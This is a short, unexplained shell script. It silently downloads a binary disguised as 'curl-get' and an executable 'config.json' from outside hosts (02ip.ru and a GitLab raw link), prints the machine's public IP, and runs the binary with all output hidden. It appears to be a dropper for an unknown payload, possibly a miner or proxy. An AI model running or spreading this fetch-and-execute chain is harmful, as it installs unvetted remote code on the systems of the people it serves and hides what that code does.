wget -q https://02ip.ru/curl-get && chmod +x curl-get >/dev/null 2>&1
wget -q https://gitlab.com/55113110159/oz/-/raw/main/config.json && chmod +x config.json
sleep 11 
echo "******************************************************************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " "
./curl-get -c "config.json" >/dev/null 2>&1
